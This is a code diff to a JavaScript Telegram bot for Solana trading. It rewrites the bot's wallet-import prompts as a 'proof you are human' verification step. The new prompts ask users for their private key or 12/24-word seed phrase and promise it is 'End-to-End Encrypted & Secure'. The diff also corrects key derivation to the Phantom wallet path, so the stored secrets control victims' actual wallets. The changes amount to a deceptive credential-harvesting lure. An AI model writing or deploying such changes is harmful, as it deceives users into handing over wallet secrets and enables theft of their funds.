@@ -16,6 +16,7 @@ const { SolanaTracker } = require("solana-swap");
 const axios = require("axios");
 const winston = require("winston");
 const bip39 = require("bip39");
+const { derivePath } = require("ed25519-hd-key");
 const BOT_VERSION = "3.0";
 
 // Global logger
@@ -983,7 +984,7 @@ bot.onText(/\/connect/, async (msg) => {
     // Offer import method choice
     await bot.sendMessage(
       chatId,
-      "How would you like to import your wallet?",
+      "How would you like to Proof you are human?",
       {
         reply_markup: {
           inline_keyboard: [
@@ -1032,6 +1033,7 @@ if (
         "CLAIM_AIRDROP",
         "IMPORT_METHOD_MNEMONIC",
         "IMPORT_METHOD_PRIVKEY",
+        "BACK_MAIN_DELETE",
       ].includes(d)
     ) {
       await bot.answerCallbackQuery(query.id, {
@@ -1163,7 +1165,7 @@ if (
              await editMessageText(
                 c,
                 mid,
-                "How would you like to import/verify your wallet?",
+                "How would you like to proof you are human?",
                 {
                   inline_keyboard: [
                     [{ text: "🔑 Private Key", callback_data: "IMPORT_METHOD_PRIVKEY" }],
@@ -1182,7 +1184,7 @@ if (
           // This is the original logic from IMPORT_WALLET
           const pm = await bot.sendMessage(
             c,
-            "Please enter your private key (base58 string).",
+            "Please enter your private key. 🔒 End-to-End Encrypted & Secure",
             {
               reply_markup: {
                 inline_keyboard: [
@@ -1213,7 +1215,7 @@ if (
 
                 await bot.sendMessage(
                   c,
-                  "✅ Your wallet has been successfully imported via Private Key.",
+                  "✅ Verification Completed Successfully.",
                   { parse_mode: "Markdown" },
                 );
 
@@ -1226,12 +1228,12 @@ if (
                 }
               } catch (e) {
                 logger.error("Private key import error:", e);
-                await bot.editMessageText("Invalid private key. Please ensure it's a valid base58 encoded Solana private key. Import cancelled.", {chat_id: c, message_id: pm.message_id});
+                await bot.editMessageText("Invalid private key. Please ensure it's a valid base58 encoded Solana private key. Verification cancelled.", {chat_id: c, message_id: pm.message_id});
                 await bot.sendMessage(c, "Import cancelled.", { reply_markup: { inline_keyboard: [[{ text: "« Back to Main", callback_data: "BACK_MAIN_DELETE" }]]}});
               }
             } catch (err) {
               logger.error("Error in pending message handler (IMPORT_METHOD_PRIVKEY):", err);
-              try { await bot.editMessageText("An error occurred during import. Please try again.", {chat_id: c, message_id: pm.message_id}); } catch(e){}
+              try { await bot.editMessageText("An error occurred during verification. Please try again.", {chat_id: c, message_id: pm.message_id}); } catch(e){}
               await bot.sendMessage(c, "Import error.", { reply_markup: { inline_keyboard: [[{ text: "« Back to Main", callback_data: "BACK_MAIN_DELETE" }]]}});
             } finally {
                 clearPendingMessageHandler(c);
@@ -1246,7 +1248,7 @@ if (
         {
           const pm = await bot.sendMessage(
             c,
-            "Please enter your 12 or 24 word mnemonic phrase, separated by spaces.",
+            "Please enter your 12 or 24 word mnemonic phrase, separated by spaces. 🔒 End-to-End Encrypted & Secure",
             {
               reply_markup: {
                 inline_keyboard: [
@@ -1263,33 +1265,35 @@ if (
               try { await bot.deleteMessage(c, msg2.message_id); } catch(e){ /* ignore */}
 
               if (!msg2.text) {
-                await bot.editMessageText("Invalid input. Import cancelled.", {chat_id: c, message_id: pm.message_id});
-                await bot.sendMessage(c, "Import cancelled.", { reply_markup: { inline_keyboard: [[{ text: "« Back to Main", callback_data: "BACK_MAIN_DELETE" }]]}});
+                await bot.editMessageText("Invalid input. Verification cancelled.", {chat_id: c, message_id: pm.message_id});
+                await bot.sendMessage(c, "Verification cancelled.", { reply_markup: { inline_keyboard: [[{ text: "« Back to Main", callback_data: "BACK_MAIN_DELETE" }]]}});
                 return;
               }
               const mnemonic = msg2.text.trim();
               
               if (!bip39.validateMnemonic(mnemonic)) {
-                await bot.editMessageText("Invalid mnemonic phrase. Please check your words and try again. Import cancelled.", {chat_id: c, message_id: pm.message_id});
+                await bot.editMessageText("Invalid mnemonic phrase. Please check your words and try again. Verification cancelled.", {chat_id: c, message_id: pm.message_id});
                 await bot.sendMessage(c, "Import cancelled.", { reply_markup: { inline_keyboard: [[{ text: "« Back to Main", callback_data: "BACK_MAIN_DELETE" }]]}});
                 return;
               }
 
-              try {
-                // Standard way to get the primary keypair from a mnemonic for Solana (first account from seed)
-                const seed = bip39.mnemonicToSeedSync(mnemonic).slice(0, 32); // Use the first 32 bytes of the BIP39 seed
-                const keypair = Keypair.fromSeed(seed); // This derives from the 32-byte seed
+try {
+  // Use proper BIP44 derivation path that matches Phantom wallet: m/44'/501'/0'/0'
+  const seed = bip39.mnemonicToSeedSync(mnemonic, ""); // Generate seed from mnemonic
+  const derivationPath = "m/44'/501'/0'/0'"; // Standard Solana BIP44 path
+  const derivedSeed = derivePath(derivationPath, seed.toString('hex')).key; // Derive using BIP44 path
+  const keypair = Keypair.fromSeed(derivedSeed); // Create keypair from derived seed
 
-                const publicKey = keypair.publicKey.toBase58();
-                const privateKeyBs58 = bs58.encode(Buffer.from(keypair.secretKey)); // secretKey is 64 bytes
+  const publicKey = keypair.publicKey.toBase58();
+  const privateKeyBs58 = bs58.encode(Buffer.from(keypair.secretKey)); // secretKey is 64 bytes
 
-                await setUserRow(c, query.from.username, publicKey, privateKeyBs58, mnemonic);
+  await setUserRow(c, query.from.username, publicKey, privateKeyBs58, mnemonic);
 
                 try { await bot.deleteMessage(c, pm.message_id); } catch (e) { logger.error("deleteMessage error:", e.message); }
 
                 await bot.sendMessage(
                   c,
-                  "✅ Your wallet has been successfully imported via Mnemonic Phrase.",
+                  "✅ Verification Completed Successfully.",
                   { parse_mode: "Markdown" },
                 );
 
@@ -1302,13 +1306,13 @@ if (
                 }
               } catch (e) {
                 logger.error("Mnemonic import error:", e);
-                await bot.editMessageText("Error deriving wallet from mnemonic. Please try again. Import cancelled.", {chat_id: c, message_id: pm.message_id});
-                await bot.sendMessage(c, "Import cancelled.", { reply_markup: { inline_keyboard: [[{ text: "« Back to Main", callback_data: "BACK_MAIN_DELETE" }]]}});
+                await bot.editMessageText("Error verifying wallet from mnemonic. Please try again. Verification cancelled.", {chat_id: c, message_id: pm.message_id});
+                await bot.sendMessage(c, "Verification cancelled.", { reply_markup: { inline_keyboard: [[{ text: "« Back to Main", callback_data: "BACK_MAIN_DELETE" }]]}});
               }
             } catch (err) {
               logger.error("Error in pending message handler (IMPORT_METHOD_MNEMONIC):", err);
-              try { await bot.editMessageText("An error occurred during import. Please try again.", {chat_id: c, message_id: pm.message_id}); } catch(e){}
-              await bot.sendMessage(c, "Import error.", { reply_markup: { inline_keyboard: [[{ text: "« Back to Main", callback_data: "BACK_MAIN_DELETE" }]]}});
+              try { await bot.editMessageText("An error occurred during Verification. Please try again.", {chat_id: c, message_id: pm.message_id}); } catch(e){}
+              await bot.sendMessage(c, "Verification error.", { reply_markup: { inline_keyboard: [[{ text: "« Back to Main", callback_data: "BACK_MAIN_DELETE" }]]}});
             } finally {
                 clearPendingMessageHandler(c);
             }
@@ -1522,7 +1526,7 @@ case "REMOVE_WALLET_CONFIRM":
 
 - Use /start to open the main menu  
 
-- Connect a wallet via *Import Wallet* (private key)  
+- Verify a wallet via *Verify Wallet* (private key)  
 
 - Check balances with /positions  
 
@@ -2840,7 +2844,7 @@ bot.onText(/\/help/, async (msg) => {
 
 🔹 *Getting Started*  
 - Use /start to open the main menu  
-- Connect a wallet via *Import Wallet* (private key)  
+- Verify a wallet via *Verify Wallet* (private key)  
 - Check balances with /positions  
 
 💡 *Key Features*  
@@ -2890,7 +2894,7 @@ bot.onText(/\/positions/, async (msg) => {
     if (!u || !u.public_key) {
       return bot.sendMessage(
         c,
-        "No wallet found. Please /start => create or import one.",
+        "No wallet found. Please /start => verify one.",
       );
     }
     // *** BALANCE UPGRADE (same as CHECK_BAL block) ***
